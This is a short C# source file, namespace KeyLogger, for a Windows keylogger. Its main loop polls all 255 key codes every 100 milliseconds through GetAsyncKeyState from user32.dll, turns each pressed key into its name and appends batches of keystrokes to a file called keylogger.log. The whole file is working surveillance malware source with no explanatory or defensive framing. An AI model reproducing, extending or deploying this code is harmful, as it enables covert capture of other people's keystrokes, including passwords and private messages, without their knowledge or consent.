using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger
{
   
    static class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        [STAThread]
        static void Main()
        {
            string temp = "";
            while (true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {   
                    int state = GetAsyncKeyState(i);
                    if (state != 0)
                    {
                        temp += ((Keys)i).ToString();
                        if (temp.Length > 10)
                        {
                            File.AppendAllText("keylogger.log", temp);
                            temp = "";
                        }
                    }
                }
            }
        }
    }
}
